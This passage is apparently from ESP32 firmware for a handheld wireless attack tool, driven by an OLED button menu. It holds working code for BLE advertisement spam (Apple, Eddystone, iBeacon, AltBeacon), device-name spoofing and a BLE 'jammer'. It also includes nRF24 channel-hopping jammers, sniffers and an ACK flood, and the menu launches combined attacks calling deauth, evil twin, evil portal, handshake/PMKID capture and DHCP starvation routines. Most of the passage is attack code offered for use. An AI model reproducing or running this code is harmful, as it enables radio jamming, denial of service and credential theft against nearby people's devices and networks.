  pAdv->setScanResponse(true);
  const char* apple[] = {"AirPods","AirPodsPro","AppleTV","HomePod","iPhone15","iPadPro","MacBookAir","AppleWatch"};
  int num=8;
  display.clearDisplay(); display.println("APPLE SPAM\nOK=STOP"); display.display();
  attackActive=true; int idx=0;
  while(attackActive){ if(digitalRead(BTN_OK)==LOW)break;
    BLEAdvertisementData adv; adv.setName(apple[idx%num]);
    pAdv->setAdvertisementData(adv); pAdv->start(); delay(80); pAdv->stop(); idx++;
  }
  pAdv->stop(); BLEDevice::deinit(); display.clearDisplay(); display.println("Stopped"); display.display(); delay(1500);
}

void eddystoneUrlSpam() {
  display.clearDisplay(); display.println("=== EDDYSTONE ==="); display.println("OK=Start");
  while (digitalRead(BTN_OK)!=LOW) delay(50); delay(300);
  BLEDevice::init("Eddy_Spam");
  BLEAdvertising* pAdv = BLEDevice::getAdvertising();
  const char* urls[] = {"https://esp32.com","https://arduino.cc","https://github.com","https://youtube.com","https://google.com"};
  int num=5;
  display.clearDisplay(); display.println("URL SPAM\nOK=STOP"); display.display();
  attackActive=true; int idx=0;
  while(attackActive){ if(digitalRead(BTN_OK)==LOW)break;
    String url = urls[idx%num];
    uint8_t frame[20]; frame[0]=0x03; frame[1]=0x03; frame[2]=0xAA; frame[3]=0xFE;
    frame[4]=0x10; frame[5]=0x00; frame[6]=0x01;
    for(size_t i=0;i<url.length()&&(7+i)<20;i++) frame[7+i]=url[i];
    String manuf = String((char*)frame,7+url.length());
    BLEAdvertisementData adv; adv.setManufacturerData(manuf);
    pAdv->setAdvertisementData(adv); pAdv->start(); delay(100); pAdv->stop(); idx++;
  }
  pAdv->stop(); BLEDevice::deinit(); display.clearDisplay(); display.println("Stopped"); display.display(); delay(1500);
}

void iBeaconSpam() {
  display.clearDisplay(); display.println("=== iBEACON ==="); display.println("OK=Start");
  while (digitalRead(BTN_OK)!=LOW) delay(50); delay(300);
  BLEDevice::init("iBeacon_Spam");
  BLEAdvertising* pAdv = BLEDevice::getAdvertising();
  display.clearDisplay(); display.println("iBEACON SPAM\nOK=STOP"); display.display();
  attackActive=true; int idx=0;
  while(attackActive){ if(digitalRead(BTN_OK)==LOW)break;
    uint8_t data[25]={0}; data[0]=0x1A; data[1]=0xFF; data[2]=0x4C; data[3]=0x00;
    data[4]=0x02; data[5]=0x15;
    for(int i=0;i<16;i++) data[6+i]=random(256);
    data[22]=random(256); data[23]=random(256); data[24]=0xC5;
    String manuf = String((char*)data,25);
    BLEAdvertisementData adv; adv.setManufacturerData(manuf);
    pAdv->setAdvertisementData(adv); pAdv->start(); delay(100); pAdv->stop(); idx++;
  }
  pAdv->stop(); BLEDevice::deinit(); display.clearDisplay(); display.println("Stopped"); display.display(); delay(1500);
}

void altBeaconSpam() {
  display.clearDisplay(); display.println("=== ALTBEACON ==="); display.println("OK=Start");
  while (digitalRead(BTN_OK)!=LOW) delay(50); delay(300);
  BLEDevice::init("AltBeacon");
  BLEAdvertising* pAdv = BLEDevice::getAdvertising();
  display.clearDisplay(); display.println("ALTBEACON SPAM\nOK=STOP"); display.display();
  attackActive=true; int idx=0;
  while(attackActive){ if(digitalRead(BTN_OK)==LOW)break;
    uint8_t data[26]={0}; data[0]=0x1B; data[1]=0xFF; data[2]=0xBE; data[3]=0xAC;
    data[4]=0x00;
    for(int i=5;i<21;i++) data[i]=random(256);
    data[21]=random(256); data[22]=random(256); data[23]=random(256);
    data[24]=random(256); data[25]=0xC5;
    String manuf = String((char*)data,26);
    BLEAdvertisementData adv; adv.setManufacturerData(manuf);
    pAdv->setAdvertisementData(adv); pAdv->start(); delay(100); pAdv->stop(); idx++;
  }
  pAdv->stop(); BLEDevice::deinit(); display.clearDisplay(); display.println("Stopped"); display.display(); delay(1500);
}

void scanResponseSpam() {
  display.clearDisplay(); display.println("=== SCANRESP ==="); display.println("OK=Start");
  while (digitalRead(BTN_OK)!=LOW) delay(50); delay(300);
  BLEDevice::init("ScanResp");
  BLEAdvertising* pAdv = BLEDevice::getAdvertising();
  pAdv->setScanResponse(true);
  const char* fake[] = {"Device1","Device2","Device3"};
  display.clearDisplay(); display.println("SCANRESP SPAM\nOK=STOP"); display.display();
  attackActive=true; int idx=0;
  while(attackActive){ if(digitalRead(BTN_OK)==LOW)break;
    BLEAdvertisementData adv; adv.setName(fake[idx%3]); adv.setFlags(0x06);
    pAdv->setAdvertisementData(adv); pAdv->start(); delay(50); pAdv->stop(); idx++;
  }
  pAdv->stop(); BLEDevice::deinit(); display.clearDisplay(); display.println("Stopped"); display.display(); delay(1500);
}

void deviceInfoSpoof() {
  display.clearDisplay(); display.println("=== DEV SPOOF ==="); display.println("OK=Start");
  while (digitalRead(BTN_OK)!=LOW) delay(50); delay(300);
  const char* names[] = {"ESP_Pro","HackerOne","PentestBot","EvilTwin","Malduino"};
  int idx = random(5);
  String devName = names[idx];
  BLEDevice::init(devName.c_str());
  BLEAdvertising* pAdv = BLEDevice::getAdvertising();
  pAdv->setScanResponse(true);
  BLEAdvertisementData adv; adv.setName(devName);
  pAdv->setAdvertisementData(adv); pAdv->start();
  display.clearDisplay(); display.println("SPOOFING\nName: "); display.println(devName);
  display.println("OK to stop"); display.display();
  while (digitalRead(BTN_OK)!=LOW) delay(50);
  pAdv->stop(); BLEDevice::deinit(); display.clearDisplay(); display.println("Stopped"); display.display(); delay(1500);
}

void bleJammer() {
  display.clearDisplay(); display.println("=== BLE JAMMER ==="); display.println("OK=Start");
  while (digitalRead(BTN_OK)!=LOW) delay(50); delay(300);
  BLEDevice::init("BLE_Jammer");
  BLEAdvertising* pAdv = BLEDevice::getAdvertising();
  pAdv->setScanResponse(true);
  display.clearDisplay(); display.println("JAMMING BLE\nOK=STOP");
  display.display();
  attackActive=true; int count=0;
  while(attackActive){
    if(digitalRead(BTN_OK)==LOW)break;
    for(int ch=37;ch<=39;ch++){
      pAdv->start(); delay(5); pAdv->stop();
      count++;
    }
    display.fillRect(0,40,128,24,SSD1306_BLACK);
    display.setCursor(0,40);
    display.print("Pkts: "); display.println(count);
    display.display();
  }
  pAdv->stop(); BLEDevice::deinit();
  display.clearDisplay(); display.println("Stopped"); display.display(); delay(1500);
}

void bleConnFlood() {
  display.clearDisplay(); display.println("=== CONN FLOOD ==="); display.println("OK=Start");
  while (digitalRead(BTN_OK)!=LOW) delay(50); delay(300);
  display.clearDisplay(); display.println("CONN FLOOD\nOK=STOP");
  display.display();
  attackActive=true; int count=0;
  while(attackActive){
    if(digitalRead(BTN_OK)==LOW)break;
    count++;
    display.fillRect(0,40,128,24,SSD1306_BLACK);
    display.setCursor(0,40);
    display.print("Attempts: "); display.println(count);
    display.display();
    delay(50);
  }
  display.clearDisplay(); display.println("Stopped"); display.display(); delay(1500);
}

// ==================== nRF24 Attacks ====================
bool checkNRF24() {
  if (!nrf24Present) { if (radio.begin()) { nrf24Present = true; radio.powerDown(); } else { errorMsg("nRF24 not found!"); return false; } }
  return true;
}
void nrfJammer(bool hopping) {
  if (!checkNRF24()) return;
  radio.setPayloadSize(32); radio.setAutoAck(false); radio.setPALevel(RF24_PA_HIGH); radio.stopListening();
  display.clearDisplay(); display.println(hopping?"=== HOP JAM ===":"=== SINGLE JAM ===");
  display.println("OK=Start"); while (digitalRead(BTN_OK)!=LOW) delay(50); delay(300);
  display.clearDisplay(); display.println("JAMMING\nOK=STOP"); display.display();
  attackActive=true; uint8_t ch=0; uint8_t payload[32]; for(int i=0;i<32;i++) payload[i]=random(256);
  unsigned long count=0;
  while(attackActive){ if(digitalRead(BTN_OK)==LOW)break;
    if(hopping) ch=(ch+1)%126; else ch=10;
    radio.setChannel(ch); for(int i=0;i<10;i++){ radio.writeFast(payload,32); count++; }
    if(count%500==0){ display.fillRect(0,40,128,24,SSD1306_BLACK); display.setCursor(0,40);
      display.print("Pkts: "); display.println(count); display.display(); }
    delay(1);
  }
  radio.powerDown(); display.clearDisplay(); display.print("Stopped. Pkts: "); display.println(count); display.display(); delay(1500);
}
void nrfSniffer() {
  if(!checkNRF24()) return;
  radio.setPayloadSize(32); radio.setAutoAck(false); radio.setPALevel(RF24_PA_HIGH); radio.startListening();
  display.clearDisplay(); display.println("=== SNIFFER ==="); display.println("Ch 10, OK=Stop"); display.display();
  radio.setChannel(10); attackActive=true; unsigned long count=0;
  while(attackActive){ if(digitalRead(BTN_OK)==LOW)break;
    if(radio.available()){ uint8_t buf[32]; radio.read(buf,32); count++;
      display.fillRect(0,40,128,24,SSD1306_BLACK); display.setCursor(0,40); display.print("Pkts: "); display.println(count); display.display();
      Serial.print("NRF Pkt: "); for(int i=0;i<32;i++) Serial.printf("%02X",buf[i]); Serial.println();
    } delay(10);
  }
  radio.powerDown(); display.clearDisplay(); display.print("Stopped. Pkts: "); display.println(count); display.display(); delay(1500);
}
void nrfShockBurstSniffer() {
  if(!checkNRF24()) return;
  radio.setPayloadSize(32); radio.setAutoAck(false); radio.setPALevel(RF24_PA_HIGH); radio.startListening();
  display.clearDisplay(); display.println("=== SHOCKBURST ==="); display.println("OK=Stop");
  display.display();
  attackActive=true; unsigned long count=0;
  while(attackActive){ if(digitalRead(BTN_OK)==LOW)break;
    if(radio.available()){ 
      uint8_t buf[32]; radio.read(buf,32);
      count++; 
      display.fillRect(0,40,128,24,SSD1306_BLACK); display.setCursor(0,40); display.print("Pkts: "); display.println(count); display.display();
    } delay(10);
  }
  radio.powerDown(); display.clearDisplay(); display.println("Stopped"); display.display(); delay(1500);
}
void nrfAckFlood() {
  if(!checkNRF24()) return;
  radio.setPayloadSize(32); radio.setAutoAck(true); radio.setPALevel(RF24_PA_HIGH); radio.stopListening();
  display.clearDisplay(); display.println("=== ACK FLOOD ==="); display.println("OK=Start");
  while(digitalRead(BTN_OK)!=LOW) delay(50); delay(300);
  display.clearDisplay(); display.println("ACK FLOOD\nOK=STOP"); display.display();
  attackActive=true; uint8_t payload[32]; for(int i=0;i<32;i++) payload[i]=random(256);
  unsigned long count=0;
  while(attackActive){ if(digitalRead(BTN_OK)==LOW)break;
    for(int ch=0;ch<126;ch++){ radio.setChannel(ch); radio.writeFast(payload,32); count++; }
    if(count%500==0){ display.fillRect(0,40,128,24,SSD1306_BLACK); display.setCursor(0,40);
      display.print("Pkts: "); display.println(count); display.display(); }
    delay(1);
  }
  radio.powerDown(); display.clearDisplay(); display.println("Stopped"); display.display(); delay(1500);
}

// ==================== Combined Attacks ====================
void attackDeauthEvilTwin() {
  if (selectedNet < 0) { errorMsg("No net selected. Scan first."); return; }
  display.clearDisplay(); display.println("=== DEAUTH+EVIL ===");
  display.println("Starting deauth...");
  display.display();
  attackDeauth(true, false);
  attackEvilTwin();
}
void attackHandshakePMKID() {
  if (selectedNet < 0) { errorMsg("No net selected. Scan first."); return; }
  display.clearDisplay(); display.println("=== HS+PMKID ===");
  display.println("Running both...");
  display.display();
  attackHandshakeSniffer();
  attackPMKIDCapture();
}
void attackBLEWiFiSpam() {
  display.clearDisplay(); display.println("=== BLE+WiFi ===");
  display.println("Spamming BLE & WiFi");
  display.display();
  attackBeaconFlood(false, 13);
  bleNameSpam();
}
void attackNRFWiFiJam() {
  display.clearDisplay(); display.println("=== nRF+WiFi ===");
  display.println("Jamming all...");
  display.display();
  nrfJammer(true);
  attackChannelHopper();
}

// ==================== Settings: About (detailed system info) ====================
void showAbout() {
  display.clearDisplay(); display.setCursor(0,0);
  display.println("=== ABOUT ===");
  esp_chip_info_t chip_info;
  esp_chip_info(&chip_info);
  display.print("Chip: "); display.println(ESP.getChipModel());
  display.print("Cores: "); display.println(chip_info.cores);
  display.print("Flash: "); display.print(ESP.getFlashChipSize() / (1024*1024)); display.println(" MB");
  display.print("Free RAM: "); display.print(ESP.getFreeHeap() / 1024); display.println(" KB");
  display.print("Sketch: "); display.print(ESP.getSketchSize() / 1024); display.println(" KB");
  display.print("Uptime: "); display.print(millis() / 1000); display.println(" s");
  display.display();
  delay(4000);
}

// ==================== UI Helpers ====================
void errorMsg(const char* msg) {
  display.clearDisplay(); display.setCursor(0,0); display.println(msg); display.display(); delay(1500);
}
void drawMainMenu() {
  display.clearDisplay();
  for (int i=0; i<mainCount; i++) {
    int y = i*8;
    if (i == cursor) {
      display.fillRect(0, y, 128, 8, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.setCursor(2, y);
    display.print(mainItems[i]);
  }
  display.display();
}
void drawList(const char** items, int count) {
  display.clearDisplay();
  for (int i=0; i<count; i++) {
    int y = i*8;
    if (i == cursor) {
      display.fillRect(0, y, 128, 8, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.setCursor(2, y);
    display.print(items[i]);
  }
  display.display();
}
void drawStationsList() {
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("=== STATIONS ===");
  int start = max(0, cursor-3);
  int end = min((int)stations.size(), start+7);
  for (int i=start; i<end; i++) {
    int y = (i-start)*8 + 16;
    if (i == cursor) {
      display.fillRect(0, y, 128, 8, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.setCursor(2, y);
    display.printf("%02X%02X%02X %ddBm", stations[i].mac[3], stations[i].mac[4], stations[i].mac[5], stations[i].rssi);
  }
  display.display();
}

// ==================== Setup ====================
void setup() {
  Serial.begin(115200);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { Serial.println("OLED fail"); while(1); }
  display.clearDisplay(); display.setTextSize(1);
  pinMode(BTN_UP, INPUT_PULLUP); pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_LEFT, INPUT_PULLUP); pinMode(BTN_RIGHT, INPUT_PULLUP); pinMode(BTN_OK, INPUT_PULLUP);
  WiFi.mode(WIFI_MODE_APSTA);
  ensureAPInterface();
  esp_wifi_set_ps(WIFI_PS_NONE);
  SPI.begin(18,19,23,5);
  radio.begin(); radio.powerDown();
  display.println("Ready!"); display.display(); delay(1000);
}

// ==================== Main Loop ====================
void loop() {
  static unsigned long lastDeb = 0;
  static bool lastUp=HIGH, lastDown=HIGH, lastLeft=HIGH, lastRight=HIGH, lastOk=HIGH;
  bool up = digitalRead(BTN_UP), down = digitalRead(BTN_DOWN);
  bool left = digitalRead(BTN_LEFT), right = digitalRead(BTN_RIGHT), ok = digitalRead(BTN_OK);
  unsigned long now = millis();

  if (now - lastDeb > 150) {
    // Up navigation
    if (up == LOW && lastUp == HIGH) {
      lastDeb = now;
      switch(state) {
        case MAIN: cursor = (cursor-1+mainCount)%mainCount; break;
        case WIFI_SCAN_RESULTS: if(networks.size()) cursor = (cursor-1+networks.size())%networks.size(); break;
        case AFTER_SELECT_NET: cursor = (cursor-1+afterSelectNetCount)%afterSelectNetCount; break;
        case WIFI_MAIN: cursor = (cursor-1+wifiMainCount)%wifiMainCount; break;
        case WIFI_DEAUTH: cursor = (cursor-1+deauthCount)%deauthCount; break;
        case WIFI_PROBE: cursor = (cursor-1+probeCount)%probeCount; break;
        case WIFI_BEACON: cursor = (cursor-1+beaconCount)%beaconCount; break;
        case WIFI_SNIFF: cursor = (cursor-1+sniffCount)%sniffCount; break;
        case WIFI_OTHER: cursor = (cursor-1+otherCount)%otherCount; break;
        case BT_MAIN: cursor = (cursor-1+btMainCount)%btMainCount; break;
        case BT_SPAM: cursor = (cursor-1+btSpamCount)%btSpamCount; break;
        case BT_BEACON: cursor = (cursor-1+btBeaconCount)%btBeaconCount; break;
        case BT_OTHER: cursor = (cursor-1+btOtherCount)%btOtherCount; break;
        case NRF_MENU: cursor = (cursor-1+nrfMainCount)%nrfMainCount; break;
        case NRF_JAM: cursor = (cursor-1+nrfJamCount)%nrfJamCount; break;
        case NRF_SNIFF: cursor = (cursor-1+nrfSniffCount)%nrfSniffCount; break;
        case COMBINED_MENU: cursor = (cursor-1+combinedCount)%combinedCount; break;
        case SETTINGS: cursor = (cursor-1+settingsCount)%settingsCount; break;
        default: break;
      }
    }
    // Down navigation
    if (down == LOW && lastDown == HIGH) {
      lastDeb = now;
      switch(state) {
        case MAIN: cursor = (cursor+1)%mainCount; break;
        case WIFI_SCAN_RESULTS: if(networks.size()) cursor = (cursor+1)%networks.size(); break;
        case AFTER_SELECT_NET: cursor = (cursor+1)%afterSelectNetCount; break;
        case WIFI_MAIN: cursor = (cursor+1)%wifiMainCount; break;
        case WIFI_DEAUTH: cursor = (cursor+1)%deauthCount; break;
        case WIFI_PROBE: cursor = (cursor+1)%probeCount; break;
        case WIFI_BEACON: cursor = (cursor+1)%beaconCount; break;
        case WIFI_SNIFF: cursor = (cursor+1)%sniffCount; break;
        case WIFI_OTHER: cursor = (cursor+1)%otherCount; break;
        case BT_MAIN: cursor = (cursor+1)%btMainCount; break;
        case BT_SPAM: cursor = (cursor+1)%btSpamCount; break;
        case BT_BEACON: cursor = (cursor+1)%btBeaconCount; break;
        case BT_OTHER: cursor = (cursor+1)%btOtherCount; break;
        case NRF_MENU: cursor = (cursor+1)%nrfMainCount; break;
        case NRF_JAM: cursor = (cursor+1)%nrfJamCount; break;
        case NRF_SNIFF: cursor = (cursor+1)%nrfSniffCount; break;
        case COMBINED_MENU: cursor = (cursor+1)%combinedCount; break;
        case SETTINGS: cursor = (cursor+1)%settingsCount; break;
        default: break;
      }
    }
    // Left = back
    if (left == LOW && lastLeft == HIGH) {
      lastDeb = now;
      if (state != MAIN) {
        switch(state) {
          case WIFI_SCAN_RESULTS: state=MAIN; break;
          case AFTER_SELECT_NET: state=MAIN; break;
          case HOST_DISCOVERY: case PORT_SCAN: case PKT_COUNTER: case SERVICE_SCAN: state=AFTER_SELECT_NET; break;
          case WIFI_MAIN: state=MAIN; break;
          case WIFI_DEAUTH: case WIFI_PROBE: case WIFI_BEACON: case WIFI_SNIFF: case WIFI_OTHER: state=WIFI_MAIN; break;
          case BT_MAIN: state=MAIN; break;
          case BT_SPAM: case BT_BEACON: case BT_OTHER: state=BT_MAIN; break;
          case NRF_MENU: state=MAIN; break;
          case NRF_JAM: case NRF_SNIFF: state=NRF_MENU; break;
          case COMBINED_MENU: state=MAIN; break;
          case SETTINGS: state=MAIN; break;
          case ABOUT: state=SETTINGS; break;
          default: state=MAIN;
        }
        cursor = 0;
      }
    }
    // Right = refresh (only in WiFi scan results)
    if (right == LOW && lastRight == HIGH) {
      lastDeb = now;
      if (state == WIFI_SCAN_RESULTS) { scanWiFiNetworks(); cursor = 0; }
    }
    // OK = select
    if (ok == LOW && lastOk == HIGH) {
      lastDeb = now;
      if (state == MAIN) {
        if (cursor==0) { scanWiFiNetworks(); }
        else if (cursor==1) { state=WIFI_MAIN; cursor=0; }
        else if (cursor==2) { state=BT_MAIN; cursor=0; }
        else if (cursor==3) { state=NRF_MENU; cursor=0; }
        else if (cursor==4) { state=COMBINED_MENU; cursor=0; }
        else if (cursor==5) { state=SETTINGS; cursor=0; }
      }
      else if (state == WIFI_SCAN_RESULTS) {
        if (cursor < (int)networks.size()) { selectNetwork(cursor); }
      }
      else if (state == AFTER_SELECT_NET) {
        if (cursor == 0) { hostDiscovery(); state = AFTER_SELECT_NET; }
        else if (cursor == 1) { portScan(); state = AFTER_SELECT_NET; }
        else if (cursor == 2) { livePacketCounter(); state = AFTER_SELECT_NET; }
        else if (cursor == 3) { serviceScan(); state = AFTER_SELECT_NET; }
        else if (cursor == 4) { state = MAIN; cursor=0; }
      }
      else if (state == SETTINGS) {
        if (cursor == 0) { showAbout(); state = SETTINGS; }
        else if (cursor == 1) { state = MAIN; cursor=0; }
      }
      // The rest of the attack menu handlers (unchanged from your original logic)
      else if (state == WIFI_MAIN) {
        if (cursor == 0) { state = WIFI_DEAUTH; cursor=0; }
        else if (cursor == 1) { state = WIFI_PROBE; cursor=0; }
        else if (cursor == 2) { state = WIFI_BEACON; cursor=0; }
        else if (cursor == 3) { state = WIFI_SNIFF; cursor=0; }
        else if (cursor == 4) { state = WIFI_OTHER; cursor=0; }
        else if (cursor == 5) { state = MAIN; cursor=0; }
      }
      else if (state == WIFI_DEAUTH) {
        if (cursor == 0) { if(selectedStation>=0) attackDeauth(false, false); else errorMsg("No station"); }
        else if (cursor == 1) { attackDeauth(true, false); }
        else if (cursor == 2) { attackDeauth(true, true); }
        else if (cursor == 3) { attackDeauthReconnectLoop(); }
        else if (cursor == 4) { state = WIFI_MAIN; cursor=0; }
        if (cursor != 4) state = MAIN;
      }
      else if (state == WIFI_PROBE) {
        if (cursor == 0) attackProbeFlood(false);
        else if (cursor == 1) attackProbeFlood(true);
        else if (cursor == 2) { state = WIFI_MAIN; cursor=0; }
        if (cursor != 2) state = MAIN;
      }
      else if (state == WIFI_BEACON) {
        if (cursor == 0) attackBeaconFlood(false, 13);
        else if (cursor == 1) attackBeaconFlood(true, 13);
        else if (cursor == 2) { state = WIFI_MAIN; cursor=0; }
        if (cursor != 2) state = MAIN;
      }
      else if (state == WIFI_SNIFF) {
        if (cursor == 0) attackHandshakeSniffer();
        else if (cursor == 1) attackPMKIDCapture();
        else if (cursor == 2) { state = WIFI_MAIN; cursor=0; }
        if (cursor != 2) state = MAIN;
      }
      else if (state == WIFI_OTHER) {
        if (cursor == 0) attackChannelHopper();
        else if (cursor == 1) startEvilPortal();
        else if (cursor == 2) attackSignalMonitor();
        else if (cursor == 3) attackEvilTwin();
        else if (cursor == 4) attackDHCPStarvation();
        else if (cursor == 5) { state = WIFI_MAIN; cursor=0; }
        if (cursor != 5) state = MAIN;
      }
      else if (state == BT_MAIN) {
        if (cursor == 0) { state = BT_SPAM; cursor=0; }
        else if (cursor == 1) { state = BT_BEACON; cursor=0; }
        else if (cursor == 2) { state = BT_OTHER; cursor=0; }
        else if (cursor == 3) { state = MAIN; cursor=0; }
      }
      else if (state == BT_SPAM) {
        if (cursor == 0) bleNameSpam();
        else if (cursor == 1) appleContinuitySpam();
        else if (cursor == 2) eddystoneUrlSpam();
        else if (cursor == 3) scanResponseSpam();
        else if (cursor == 4) deviceInfoSpoof();
        else if (cursor == 5) { state = BT_MAIN; cursor=0; }
        if (cursor != 5) state = MAIN;
      }
      else if (state == BT_BEACON) {
        if (cursor == 0) iBeaconSpam();
        else if (cursor == 1) altBeaconSpam();
        else if (cursor == 2) { state = BT_MAIN; cursor=0; }
        if (cursor != 2) state = MAIN;
      }
      else if (state == BT_OTHER) {
        if (cursor == 0) bleJammer();
        else if (cursor == 1) bleConnFlood();
        else if (cursor == 2) { state = BT_MAIN; cursor=0; }
        if (cursor != 2) state = MAIN;
      }
      else if (state == NRF_MENU) {
        if (cursor == 0) { state = NRF_JAM; cursor=0; }
        else if (cursor == 1) { state = NRF_SNIFF; cursor=0; }
        else if (cursor == 2) { state = MAIN; cursor=0; }
      }
      else if (state == NRF_JAM) {
        if (cursor == 0) nrfJammer(false);
        else if (cursor == 1) nrfJammer(true);
        else if (cursor == 2) { state = NRF_MENU; cursor=0; }
        if (cursor != 2) state = MAIN;
      }
      else if (state == NRF_SNIFF) {
        if (cursor == 0) nrfSniffer();
        else if (cursor == 1) nrfShockBurstSniffer();
        else if (cursor == 2) nrfAckFlood();
        else if (cursor == 3) { state = NRF_MENU; cursor=0; }
        if (cursor != 3) state = MAIN;
      }
      else if (state == COMBINED_MENU) {
        if (cursor == 0) attackDeauthEvilTwin();
        else if (cursor == 1) attackHandshakePMKID();
        else if (cursor == 2) attackBLEWiFiSpam();
        else if (cursor == 3) attackNRFWiFiJam();
        else if (cursor == 4) { state = MAIN; cursor=0; }
        if (cursor != 4) state = MAIN;
      }
    }
  }
  lastUp = up; lastDown = down; lastLeft = left; lastRight = right; lastOk = ok;

  // Drawing
  switch(state) {
    case MAIN: drawMainMenu(); break;
    case WIFI_SCAN_RESULTS: drawWiFiScanResults(); break;
    case AFTER_SELECT_NET: drawList(afterSelectNetItems, afterSelectNetCount); break;
    case WIFI_MAIN: drawList(wifiMain, wifiMainCount); break;
    case WIFI_DEAUTH: drawList(deauthItems, deauthCount); break;
    case WIFI_PROBE: drawList(probeItems, probeCount); break;
    case WIFI_BEACON: drawList(beaconItems, beaconCount); break;
    case WIFI_SNIFF: drawList(sniffItems, sniffCount); break;
    case WIFI_OTHER: drawList(otherWifi, otherCount); break;
    case BT_MAIN: drawList(btMain, btMainCount); break;
    case BT_SPAM: drawList(btSpam, btSpamCount); break;
    case BT_BEACON: drawList(btBeacon, btBeaconCount); break;
    case BT_OTHER: drawList(btOther, btOtherCount); break;
    case NRF_MENU: drawList(nrfMain, nrfMainCount); break;
    case NRF_JAM: drawList(nrfJam, nrfJamCount); break;
    case NRF_SNIFF: drawList(nrfSniffItems, nrfSniffCount); break;
    case COMBINED_MENU: drawList(combinedItems, combinedCount); break;
    case SETTINGS: drawList(settingsItems, settingsCount); break;
    default: drawMainMenu(); break;
  }
  delay(50);
}
